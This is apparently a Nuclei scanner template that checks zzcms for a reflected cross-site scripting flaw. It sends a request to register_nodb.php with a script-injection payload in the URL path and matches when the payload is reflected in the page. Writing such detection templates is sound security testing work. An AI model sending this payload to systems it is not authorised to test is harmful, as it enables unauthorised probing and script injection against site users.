id: zzcms-register_nodb-xss

info:
  name: zzcms-register_nodb-xss
  author: iSee857
  severity: medium
  description: |
    zzcms-register_nodb-xss.
  tags: xss,zzcms

http:
  - method: GET
    path:
      - '{{BaseURL}}/3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><script>alert(document.domain)</script>'
          - 'example=register'
        condition: and

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: status
        status:
          - 200